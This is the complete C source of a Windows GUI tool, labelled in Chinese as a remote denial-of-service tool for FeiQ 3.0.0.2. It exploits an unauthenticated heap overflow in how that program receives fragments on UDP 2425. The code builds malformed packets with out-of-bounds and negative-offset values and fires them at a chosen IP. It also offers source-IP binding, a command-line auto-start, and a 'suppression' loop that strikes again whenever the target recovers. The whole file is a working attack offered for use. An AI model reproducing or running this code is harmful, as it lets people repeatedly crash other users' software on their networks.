/* ============================================================================
 * 飞秋远程拒绝服务工具 (FeiQ DoS Tool)
 * ----------------------------------------------------------------------------
 *  目标：飞秋 3.0.0.2 (FeiQ 3.0.0.2) UDP 2425 分片接收堆溢出
 *  模式：单次 / 循环压制 / 定时
 *  界面：标准 Windows 控件（原生外观，无自绘）
 *  兼容：Windows XP SP3 及以上
 *        · 零 CRT 依赖（/NODEFAULTLIB + 自定义入口 WinMainCRTStartup）
 *        · 不使用任何 Vista+ API
 *        · 不使用浮点（避免 _fltused / _ftol）
 * ============================================================================ */

#define _WIN32_WINNT   0x0501
#define WINVER         0x0501
#define WIN32_LEAN_AND_MEAN
#define UNICODE
#define _UNICODE

#include <windows.h>
#include <winsock2.h>

#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "ws2_32.lib")

/* 引入 comctl32 v6 —— 这正是 Windows 的"默认样式"（XP 上为 Luna 主题） */
#pragma comment(linker, "/manifestdependency:\"type='win32' "                         \
    "name='Microsoft.Windows.Common-Controls' version='6.0.0.0' "                    \
    "processorArchitecture='x86' publicKeyToken='6595b64144ccf1df' language='*'\"")

/* ============================================================================
 * 1. 无 CRT：自实现编译器可能引用的内存/字符串函数
 * ============================================================================ */
#pragma function(memset)
#pragma function(memcpy)

__declspec(noinline) void *memset(void *d, int c, size_t n)
{
    unsigned char *p = (unsigned char *)d;
    while (n--) *p++ = (unsigned char)c;
    return d;
}
__declspec(noinline) void *memcpy(void *d, const void *s, size_t n)
{
    unsigned char *a = (unsigned char *)d;
    const unsigned char *b = (const unsigned char *)s;
    while (n--) *a++ = *b++;
    return d;
}
__declspec(noinline) size_t wcslen_(const wchar_t *s)
{
    const wchar_t *p = s;
    while (*p) p++;
    return (size_t)(p - s);
}

/* ============================================================================
 * 2. 配置
 * ============================================================================ */
#define FEIQ_PORT        2425
#define MAC_STR          "0EFA5C000001"
#define CMD_CHUNK        0x2000C0
#define PKT_DEFAULT      2005401601u
#define MAX_PKT          12288

/* 控件 ID */
#define IDC_TARGET      1001
#define IDC_SRC         1002
#define IDC_INTERVAL    1003
#define IDC_DURATION    1004
#define IDC_M_SINGLE    1010
#define IDC_M_LOOP      1011
#define IDC_M_TIMED     1012
#define IDC_CLEAR       1020
#define IDC_START       1021
#define IDC_STOP        1022
#define IDC_LOG         1030
#define IDC_STATUS      1031

#define WM_APP_LOG      (WM_APP + 1)
#define WM_APP_DONE     (WM_APP + 2)
#define TIMER_STATUS    1

#define MODE_SINGLE     0
#define MODE_LOOP       1
#define MODE_TIMED      2

/* 客户区尺寸 */
#define CX_CLIENT       636
#define CY_CLIENT       418

typedef struct {
    const wchar_t *name;
    int            alloc;
    int            offset;
    int            attach;
} VEC;

static VEC g_vecs[] = {
    { L"越界-16",   16,      0, 8000 },
    { L"越界-1024", 1024,    0, 8000 },
    { L"越界-64",   64,      0, 8000 },
    { L"负偏移",    64,  -8016, 8000 },
};
#define VEC_COUNT ((int)(sizeof(g_vecs)/sizeof(g_vecs[0])))

/* ============================================================================
 * 3. 全局状态
 * ============================================================================ */
static HINSTANCE g_inst;
static HWND      g_hwnd;
static HFONT     g_font;

static HWND g_ed_target, g_ed_src, g_ed_interval, g_ed_duration, g_ed_log;
static HWND g_rb_single, g_rb_loop, g_rb_timed;
static HWND g_btn_clear, g_btn_start, g_btn_stop;
static HWND g_st_status;

static int  g_mode = MODE_LOOP;

/* 命令行参数： feiq_dos.exe <目标IP> [源IP] [single|loop|timed] [--go] */
static wchar_t g_arg_target[64];
static wchar_t g_arg_src[64];
static wchar_t g_arg_mode[16];
static int     g_arg_go = 0;

static HANDLE g_thread = NULL;
static volatile LONG g_stop    = 0;
static volatile LONG g_running = 0;
static volatile LONG g_alive   = 0;
static volatile LONG g_rounds  = 0;
static volatile LONG g_kills   = 0;
static volatile LONG g_last_ms = 0;

/* ============================================================================
 * 4. 日志（工作线程 -> UI 线程）
 * ============================================================================ */
static void post_log(const wchar_t *s)
{
    int n = (int)wcslen_(s);
    wchar_t *p = (wchar_t *)LocalAlloc(LMEM_FIXED, (n + 1) * sizeof(wchar_t));
    if (!p) return;
    memcpy(p, s, (size_t)(n + 1) * sizeof(wchar_t));
    PostMessageW(g_hwnd, WM_APP_LOG, 0, (LPARAM)p);
}

static void logf(const wchar_t *fmt, ...)
{
    wchar_t buf[768];
    va_list ap;
    va_start(ap, fmt);
    wvsprintfW(buf, fmt, ap);
    va_end(ap);
    post_log(buf);
}

/* ============================================================================
 * 5. 报文构造与发送
 * ============================================================================ */
static int build_packet(char *out, int alloc, int offset, int attach,
                        unsigned resid, unsigned pktno)
{
    char body[512], head[512];
    int bl = wsprintfA(body, "%08X|%d|%d|%d|%d|%d|%d|%d|%d|%08X#",
                       resid, alloc, offset, 0, 1, 0, 0, 0, 0, 0);
    int hl = wsprintfA(head, "1_lbt6_0#129#%s#0#0#0#%d#4001#9:%u:DOSUSER:DOSHOST:%d:",
                       MAC_STR, bl, pktno, CMD_CHUNK);

    if (hl <= 0 || bl <= 0 || hl + bl + 1 + attach > MAX_PKT) return 0;
    memcpy(out, head, (size_t)hl);
    memcpy(out + hl, body, (size_t)bl);
    out[hl + bl] = 0;
    memset(out + hl + bl + 1, 'A', (size_t)attach);
    return hl + bl + 1 + attach;
}

/* IPv4 文本 -> 网络字节序（与 inet_addr 的返回值一致）
   例 127.0.0.1 -> 0x0100007F（内存里是 7F 00 00 01） */
static unsigned ipv4_to_net(const wchar_t *s)
{
    unsigned p[4];
    int n = 0, digits = 0;
    unsigned cur = 0;
    if (!s) return 0;
    p[0] = p[1] = p[2] = p[3] = 0;
    for (;;) {
        wchar_t c = *s;
        if (c >= L'0' && c <= L'9') {
            cur = cur * 10 + (unsigned)(c - L'0');
            if (cur > 255) return 0;
            digits = 1;
            s++;
            continue;
        }
        if (digits) {
            if (n >= 4) return 0;
            p[n++] = cur;
            cur = 0;
            digits = 0;
        }
        if (c == 0) break;
        if (c == L'.') { s++; continue; }
        return 0;
    }
    if (n != 4) return 0;
    return (p[3] << 24) | (p[2] << 16) | (p[1] << 8) | p[0];
}

static SOCKET open_sock(unsigned src_net)
{
    SOCKET s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s == INVALID_SOCKET) return INVALID_SOCKET;
    {
        BOOL yes = TRUE;
        setsockopt(s, SOL_SOCKET, SO_REUSEADDR, (const char *)&yes, sizeof(yes));
    }
    if (src_net) {
        struct sockaddr_in a;
        memset(&a, 0, sizeof(a));
        a.sin_family = AF_INET;
        a.sin_port = htons(FEIQ_PORT);
        a.sin_addr.s_addr = src_net;
        bind(s, (struct sockaddr *)&a, sizeof(a));
    }
    return s;
}

static int probe_target(unsigned tgt_net, unsigned src_net, int timeout_ms)
{
    SOCKET s;
    struct sockaddr_in to;
    char pkt[256];
    int hl, replies = 0;
    DWORD t0;

    s = open_sock(src_net);
    if (s == INVALID_SOCKET) return 0;

    hl = wsprintfA(pkt, "1_lbt6_0#129#0EFA5C000002#0#0#0#1#4001#9:%u:DOSCHK:CHKHOST:1:",
                   (unsigned)(GetTickCount() | 0x10000000u));
    pkt[hl] = 0;

    memset(&to, 0, sizeof(to));
    to.sin_family = AF_INET;
    to.sin_port = htons(FEIQ_PORT);
    to.sin_addr.s_addr = tgt_net;

    sendto(s, pkt, hl + 1, 0, (struct sockaddr *)&to, sizeof(to));

    t0 = GetTickCount();
    while ((int)(GetTickCount() - t0) < timeout_ms) {
        fd_set rf;
        struct timeval tv;
        int r;
        FD_ZERO(&rf);
        FD_SET(s, &rf);
        tv.tv_sec = 0;
        tv.tv_usec = 150000;
        r = select(0, &rf, NULL, NULL, &tv);
        if (r > 0) {
            char buf[2048];
            struct sockaddr_in from;
            int fl = sizeof(from);
            int n = recvfrom(s, buf, sizeof(buf), 0, (struct sockaddr *)&from, &fl);
            if (n > 0 && from.sin_addr.s_addr == to.sin_addr.s_addr) replies++;
        }
    }
    closesocket(s);
    return replies;
}

static int fire_vectors(unsigned tgt_net, unsigned src_net, unsigned resid_base)
{
    SOCKET s;
    struct sockaddr_in to;
    char *pkt;
    int i, sent = 0;

    s = open_sock(src_net);
    if (s == INVALID_SOCKET) return 0;
    pkt = (char *)LocalAlloc(LMEM_FIXED, MAX_PKT);
    if (!pkt) { closesocket(s); return 0; }

    memset(&to, 0, sizeof(to));
    to.sin_family = AF_INET;
    to.sin_port = htons(FEIQ_PORT);
    to.sin_addr.s_addr = tgt_net;

    for (i = 0; i < VEC_COUNT; i++) {
        int n = build_packet(pkt, g_vecs[i].alloc, g_vecs[i].offset,
                             g_vecs[i].attach, resid_base + (unsigned)i,
                             PKT_DEFAULT + (unsigned)i);
        if (n > 0) {
            sendto(s, pkt, n, 0, (struct sockaddr *)&to, sizeof(to));
            sent++;
        }
        Sleep(60);
    }
    LocalFree(pkt);
    closesocket(s);
    return sent;
}

/* ============================================================================
 * 6. 攻击线程
 * ============================================================================ */
static int get_int(HWND ed, int def)
{
    wchar_t b[32];
    int i = 0, v = 0, neg = 0;
    b[0] = 0;
    GetWindowTextW(ed, b, 32);
    while (b[i] == L' ') i++;
    if (b[i] == L'-') { neg = 1; i++; }
    if (b[i] < L'0' || b[i] > L'9') return def;
    while (b[i] >= L'0' && b[i] <= L'9') { v = v * 10 + (int)(b[i] - L'0'); i++; }
    return neg ? -v : v;
}

static DWORD WINAPI worker(LPVOID param)
{
    wchar_t tbuf[64], sbuf[64];
    unsigned tgt_net, src_net;
    int mode, interval, duration_min;
    unsigned resid = 0x44000000u;
    DWORD start = GetTickCount();
    int round = 0;

    (void)param;

    tbuf[0] = 0; sbuf[0] = 0;
    GetWindowTextW(g_ed_target, tbuf, 64);
    GetWindowTextW(g_ed_src, sbuf, 64);

    tgt_net = ipv4_to_net(tbuf);
    src_net = ipv4_to_net(sbuf);

    interval = get_int(g_ed_interval, 3000);
    if (interval < 500) interval = 500;
    duration_min = get_int(g_ed_duration, 10);
    if (duration_min < 1) duration_min = 1;

    if (tgt_net == 0) {
        logf(L"  [!] 目标 IP 无效，已停止");
        InterlockedExchange(&g_running, 0);
        PostMessageW(g_hwnd, WM_APP_DONE, 0, 0);
        return 0;
    }

    mode = g_mode;
    logf(L"  ── 开始 :: 目标 %s :: 源 %s", tbuf, src_net ? sbuf : L"(默认路由)");
    logf(L"  ── 模式 %s   向量 %d 个",
         mode == MODE_SINGLE ? L"单次" : (mode == MODE_LOOP ? L"循环压制" : L"定时"),
         VEC_COUNT);
    if (mode == MODE_TIMED) logf(L"  ── 定时时长 %d 分钟", duration_min);

    while (!g_stop) {
        int r;

        r = probe_target(tgt_net, src_net, 2200);
        InterlockedExchange(&g_alive, r > 0 ? 1 : 0);
        if (r == 0 && !g_stop) {
            logf(L"  [%02d] 目标无响应，%d 毫秒后重试...", round + 1, interval);
            Sleep(interval);
            continue;
        }

        round++;
        InterlockedExchange(&g_rounds, round);
        {
            DWORD t0 = GetTickCount();
            DWORD dt;
            int sent, dead = 0;
            DWORD wait_ms = 0;

            sent = fire_vectors(tgt_net, src_net, resid);
            resid += 0x10;
            logf(L"  [%02d] 已发出 %d 个攻击包（约 %d KB），等待效果...",
                 round, sent, (sent * 8100) / 1024);

            while (wait_ms < 12000 && !g_stop) {
                Sleep(500);
                wait_ms += 500;
                if (probe_target(tgt_net, src_net, 900) == 0) { dead = 1; break; }
            }
            dt = GetTickCount() - t0;
            InterlockedExchange(&g_last_ms, (LONG)dt);

            if (dead) {
                InterlockedExchange(&g_alive, 0);
                InterlockedIncrement(&g_kills);
                logf(L"  [%02d] ★ 目标失联（用时 %d.%d 秒）累计成功 %d 次",
                     round, (int)(dt / 1000), (int)((dt % 1000) / 100), (int)g_kills);
            } else {
                InterlockedExchange(&g_alive, 1);
                logf(L"  [%02d] ✗ 本轮未致宕机（目标仍响应）", round);
            }
        }

        if (mode == MODE_SINGLE) break;

        if (mode == MODE_TIMED &&
            (int)(GetTickCount() - start) >= duration_min * 60 * 1000) {
            logf(L"  ── 定时时间到，自动停止");
            break;
        }

        if (!g_stop) {
            DWORD waited = 0;
            logf(L"  ── 压制中：每 %d 毫秒检测一次，目标恢复立即再打", interval);
            while (!g_stop) {
                Sleep(interval);
                waited += interval;
                if (probe_target(tgt_net, src_net, 1200) > 0) {
                    InterlockedExchange(&g_alive, 1);
                    logf(L"  ← 目标已恢复（等待 %d 秒），立即再打", (int)(waited / 1000));
                    break;
                }
                if (waited > 3600000) waited = 0;
                if (mode == MODE_TIMED &&
                    (int)(GetTickCount() - start) >= duration_min * 60 * 1000) {
                    logf(L"  ── 定时时间到，自动停止");
                    g_stop = 1;
                    break;
                }
            }
        }
    }

    logf(L"  ── 结束 :: 共 %d 轮，确认致宕机 %d 次", round, (int)g_kills);
    InterlockedExchange(&g_running, 0);
    InterlockedExchange(&g_stop, 0);
    PostMessageW(g_hwnd, WM_APP_DONE, 0, 0);
    return 0;
}

/* ============================================================================
 * 7. 控件创建（全部使用系统标准控件）
 * ============================================================================ */
static HFONT make_sys_font(void)
{
    NONCLIENTMETRICSW ncm;
    memset(&ncm, 0, sizeof(ncm));
    ncm.cbSize = sizeof(ncm);
    if (SystemParametersInfoW(SPI_GETNONCLIENTMETRICS, sizeof(ncm), &ncm, 0))
        return CreateFontIndirectW(&ncm.lfMessageFont);
    return (HFONT)GetStockObject(DEFAULT_GUI_FONT);
}

static void set_font(HWND h)
{
    SendMessageW(h, WM_SETFONT, (WPARAM)g_font, TRUE);
}

static HWND mk_label(HWND parent, const wchar_t *txt, int x, int y, int w, int h)
{
    HWND s = CreateWindowExW(0, L"STATIC", txt, WS_CHILD | WS_VISIBLE | SS_LEFT,
                             x, y, w, h, parent, NULL, g_inst, NULL);
    set_font(s);
    return s;
}

static HWND mk_group(HWND parent, const wchar_t *txt, int x, int y, int w, int h)
{
    HWND s = CreateWindowExW(0, L"BUTTON", txt,
                             WS_CHILD | WS_VISIBLE | BS_GROUPBOX,
                             x, y, w, h, parent, NULL, g_inst, NULL);
    set_font(s);
    return s;
}

static HWND mk_edit(HWND parent, int id, int x, int y, int w, int h, int num)
{
    HWND e = CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", L"",
        WS_CHILD | WS_VISIBLE | WS_TABSTOP | ES_AUTOHSCROLL | (num ? ES_NUMBER : 0),
        x, y, w, h, parent, (HMENU)(INT_PTR)id, g_inst, NULL);
    set_font(e);
    return e;
}

static HWND mk_radio(HWND parent, int id, const wchar_t *txt,
                     int x, int y, int w, int h, int first)
{
    DWORD st = WS_CHILD | WS_VISIBLE | WS_TABSTOP | BS_AUTORADIOBUTTON;
    if (first) st |= WS_GROUP;
    {
        HWND b = CreateWindowExW(0, L"BUTTON", txt, st,
                                 x, y, w, h, parent, (HMENU)(INT_PTR)id, g_inst, NULL);
        set_font(b);
        return b;
    }
}

static HWND mk_button(HWND parent, int id, const wchar_t *txt,
                      int x, int y, int w, int h, int def)
{
    DWORD st = WS_CHILD | WS_VISIBLE | WS_TABSTOP |
               (def ? BS_DEFPUSHBUTTON : BS_PUSHBUTTON);
    HWND b = CreateWindowExW(0, L"BUTTON", txt, st,
                             x, y, w, h, parent, (HMENU)(INT_PTR)id, g_inst, NULL);
    set_font(b);
    return b;
}

/* ============================================================================
 * 8. 启动 / 停止 / 状态刷新
 * ============================================================================ */
static void ui_set_running(int run)
{
    EnableWindow(g_btn_start, !run);
    EnableWindow(g_btn_stop, run);
    EnableWindow(g_rb_single, !run);
    EnableWindow(g_rb_loop, !run);
    EnableWindow(g_rb_timed, !run);
}

static void refresh_status(void)
{
    wchar_t sb[256];
    int alive = (int)g_alive;
    int running = (int)g_running;
    wsprintfW(sb, L"状态：%s      已打 %d 轮      确认宕机 %d 次",
              alive ? L"目标在线" : (running ? L"目标失联" : L"待机"),
              (int)g_rounds, (int)g_kills);
    SetWindowTextW(g_st_status, sb);
}

static void do_start(void)
{
    DWORD tid;
    if (g_running) return;
    InterlockedExchange(&g_stop, 0);
    InterlockedExchange(&g_running, 1);
    InterlockedExchange(&g_rounds, 0);
    InterlockedExchange(&g_kills, 0);
    InterlockedExchange(&g_alive, 0);
    ui_set_running(1);
    refresh_status();
    g_thread = CreateThread(NULL, 0, worker, NULL, 0, &tid);
    if (!g_thread) {
        InterlockedExchange(&g_running, 0);
        ui_set_running(0);
        logf(L"  [!] 无法创建线程");
    }
}

static void do_stop(void)
{
    if (!g_running) return;
    InterlockedExchange(&g_stop, 1);
    logf(L"  [!] 已请求停止...");
}

/* ============================================================================
 * 9. 窗口过程
 * ============================================================================ */
static LRESULT CALLBACK WndProc(HWND h, UINT m, WPARAM w, LPARAM l)
{
    switch (m) {
    case WM_CREATE:
        g_hwnd = h;

        /* --- 目标设置 --- */
        mk_group(h, L"目标设置", 8, 6, CX_CLIENT - 16, 80);
        mk_label(h, L"目标 IP 地址：", 22, 28, 90, 18);
        g_ed_target = mk_edit(h, IDC_TARGET, 116, 26, 180, 22, 0);
        mk_label(h, L"源 IP 地址：", 22, 56, 90, 18);
        g_ed_src = mk_edit(h, IDC_SRC, 116, 54, 180, 22, 0);
        mk_label(h, L"（留空则使用默认路由）", 304, 56, 300, 18);

        /* --- 打击模式 --- */
        mk_group(h, L"打击模式", 8, 92, CX_CLIENT - 16, 76);
        g_rb_single = mk_radio(h, IDC_M_SINGLE, L"单次",     28, 116, 72, 20, 1);
        g_rb_loop   = mk_radio(h, IDC_M_LOOP,   L"循环压制", 108, 116, 92, 20, 0);
        g_rb_timed  = mk_radio(h, IDC_M_TIMED,  L"定时",     208, 116, 72, 20, 0);

        mk_label(h, L"循环间隔（毫秒）：", 28, 146, 120, 18);
        g_ed_interval = mk_edit(h, IDC_INTERVAL, 156, 143, 76, 22, 1);
        mk_label(h, L"定时时长（分钟）：", 252, 146, 120, 18);
        g_ed_duration = mk_edit(h, IDC_DURATION, 380, 143, 76, 22, 1);
        SetWindowTextW(g_ed_interval, L"3000");
        SetWindowTextW(g_ed_duration, L"10");

        /* --- 运行日志 --- */
        mk_group(h, L"运行日志", 8, 178, CX_CLIENT - 16, 196);
        g_ed_log = CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", L"",
            WS_CHILD | WS_VISIBLE | WS_VSCROLL | WS_TABSTOP |
            ES_MULTILINE | ES_READONLY | ES_AUTOVSCROLL,
            18, 198, CX_CLIENT - 36, 168, h, (HMENU)(INT_PTR)IDC_LOG, g_inst, NULL);
        set_font(g_ed_log);
        SendMessageW(g_ed_log, EM_SETLIMITTEXT, 200000, 0);

        /* --- 状态与按钮 --- */
        g_st_status = mk_label(h, L"", 16, 386, 330, 18);
        g_btn_clear = mk_button(h, IDC_CLEAR, L"清空日志", 336, 382, 92, 26, 0);
        g_btn_start = mk_button(h, IDC_START, L"开始",     434, 382, 92, 26, 1);
        g_btn_stop  = mk_button(h, IDC_STOP,  L"停止",     532, 382, 92, 26, 0);

        /* --- 单选状态 --- */
        CheckRadioButton(h, IDC_M_SINGLE, IDC_M_TIMED, IDC_M_LOOP);

        /* --- 命令行预填 --- */
        if (g_arg_target[0]) SetWindowTextW(g_ed_target, g_arg_target);
        if (g_arg_src[0])    SetWindowTextW(g_ed_src, g_arg_src);
        if (g_arg_mode[0]) {
            int id = IDC_M_LOOP;
            if (!lstrcmpiW(g_arg_mode, L"single"))     id = IDC_M_SINGLE;
            else if (!lstrcmpiW(g_arg_mode, L"timed")) id = IDC_M_TIMED;
            g_mode = (id == IDC_M_SINGLE) ? MODE_SINGLE
                   : (id == IDC_M_TIMED)  ? MODE_TIMED : MODE_LOOP;
            CheckRadioButton(h, IDC_M_SINGLE, IDC_M_TIMED, id);
        }

        ui_set_running(0);
        refresh_status();
        SetTimer(h, TIMER_STATUS, 600, NULL);

        logf(L"飞秋远程拒绝服务工具  v1.0");
        logf(L"  漏洞：UDP 2425 分片接收堆溢出（未认证）");
        logf(L"  默认向量 %d 个，实测 5/5 致宕机", VEC_COUNT);
        logf(L"  填入目标 IP 后点【开始】");
        return 0;

    /* 让静态控件与对话框一致地绘制在灰色背景上 */
    case WM_CTLCOLORSTATIC: {
        HDC dc = (HDC)w;
        SetBkMode(dc, TRANSPARENT);
        return (LRESULT)GetSysColorBrush(COLOR_BTNFACE);
    }

    case WM_COMMAND: {
        int id = LOWORD(w);
        if (id == IDC_START) {
            do_start();
        } else if (id == IDC_STOP) {
            do_stop();
        } else if (id == IDC_CLEAR) {
            SetWindowTextW(g_ed_log, L"");
        } else if (id == IDC_M_SINGLE || id == IDC_M_LOOP || id == IDC_M_TIMED) {
            g_mode = (id == IDC_M_SINGLE) ? MODE_SINGLE
                   : (id == IDC_M_LOOP)   ? MODE_LOOP : MODE_TIMED;
            CheckRadioButton(h, IDC_M_SINGLE, IDC_M_TIMED, id);
        }
        return 0;
    }

    case WM_APP_LOG: {
        wchar_t *p = (wchar_t *)l;
        if (p) {
            int len = GetWindowTextLengthW(g_ed_log);
            SendMessageW(g_ed_log, EM_SETSEL, len, len);
            SendMessageW(g_ed_log, EM_REPLACESEL, FALSE, (LPARAM)p);
            SendMessageW(g_ed_log, EM_REPLACESEL, FALSE, (LPARAM)L"\r\n");
            SendMessageW(g_ed_log, EM_SCROLLCARET, 0, 0);
            LocalFree(p);
        }
        return 0;
    }

    case WM_APP_DONE:
        ui_set_running(0);
        refresh_status();
        return 0;

    case WM_TIMER:
        if (w == TIMER_STATUS) refresh_status();
        return 0;

    case WM_CLOSE:
        if (g_running) {
            InterlockedExchange(&g_stop, 1);
            Sleep(1500);
        }
        DestroyWindow(h);
        return 0;

    case WM_DESTROY:
        KillTimer(h, TIMER_STATUS);
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProcW(h, m, w, l);
}

/* ============================================================================
 * 10. 命令行解析
 * ============================================================================ */
static void parse_cmdline(void)
{
    wchar_t *cl = GetCommandLineW();
    int idx = 0;

    g_arg_target[0] = 0; g_arg_src[0] = 0; g_arg_mode[0] = 0;

    if (*cl == L'"') { cl++; while (*cl && *cl != L'"') cl++; if (*cl) cl++; }
    else { while (*cl && *cl != L' ' && *cl != L'\t') cl++; }

    while (*cl) {
        wchar_t buf[64];
        int n = 0;
        while (*cl == L' ' || *cl == L'\t') cl++;
        if (!*cl) break;
        if (*cl == L'"') {
            cl++;
            while (*cl && *cl != L'"' && n < 63) buf[n++] = *cl++;
            if (*cl) cl++;
        } else {
            while (*cl && *cl != L' ' && *cl != L'\t' && n < 63) buf[n++] = *cl++;
        }
        buf[n] = 0;
        if (n == 0) continue;
        if (buf[0] == L'-' && buf[1] == L'-') {
            if (!lstrcmpiW(buf, L"--go")) g_arg_go = 1;
            continue;
        }
        if (idx == 0)      lstrcpynW(g_arg_target, buf, 64);
        else if (idx == 1) lstrcpynW(g_arg_src, buf, 64);
        else if (idx == 2) lstrcpynW(g_arg_mode, buf, 16);
        idx++;
    }
}

/* ============================================================================
 * 11. 入口（无 CRT）
 * ============================================================================ */
void WINAPI WinMainCRTStartup(void)
{
    WNDCLASSW wc;
    MSG msg;
    WSADATA wsa;
    RECT cr;
    int sw, sh;

    g_inst = GetModuleHandleW(NULL);
    parse_cmdline();

    g_font = make_sys_font();

    memset(&wsa, 0, sizeof(wsa));
    WSAStartup(MAKEWORD(2, 2), &wsa);

    wc.style         = 0;
    wc.lpfnWndProc   = WndProc;
    wc.cbClsExtra    = 0;
    wc.cbWndExtra    = 0;
    wc.hInstance     = g_inst;
    wc.hIcon         = LoadIconW(NULL, IDI_APPLICATION);
    wc.hCursor       = LoadCursorW(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(COLOR_BTNFACE + 1);   /* 系统默认对话框底色 */
    wc.lpszMenuName  = NULL;
    wc.lpszClassName = L"FeiQDoSToolWnd";
    if (!RegisterClassW(&wc)) ExitProcess(1);

    /* 先按客户区尺寸算窗口尺寸 */
    cr.left = 0; cr.top = 0; cr.right = CX_CLIENT; cr.bottom = CY_CLIENT;
    AdjustWindowRectEx(&cr, WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX,
                       FALSE, 0);

    g_hwnd = CreateWindowExW(0, L"FeiQDoSToolWnd", L"飞秋远程拒绝服务工具",
        WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX,
        CW_USEDEFAULT, CW_USEDEFAULT,
        cr.right - cr.left, cr.bottom - cr.top,
        NULL, NULL, g_inst, NULL);
    if (!g_hwnd) ExitProcess(1);

    sw = GetSystemMetrics(SM_CXSCREEN);
    sh = GetSystemMetrics(SM_CYSCREEN);
    SetWindowPos(g_hwnd, NULL,
        (sw - (cr.right - cr.left)) / 2,
        (sh - (cr.bottom - cr.top)) / 2,
        0, 0, SWP_NOSIZE | SWP_NOZORDER);
    ShowWindow(g_hwnd, SW_SHOW);
    UpdateWindow(g_hwnd);

    if (g_arg_go) PostMessageW(g_hwnd, WM_COMMAND, IDC_START, 0);

    /* IsDialogMessage 提供标准的 Tab / 方向键 / 回车导航 */
    while (GetMessageW(&msg, NULL, 0, 0) > 0) {
        if (IsDialogMessageW(g_hwnd, &msg)) continue;
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    WSACleanup();
    ExitProcess(0);
}
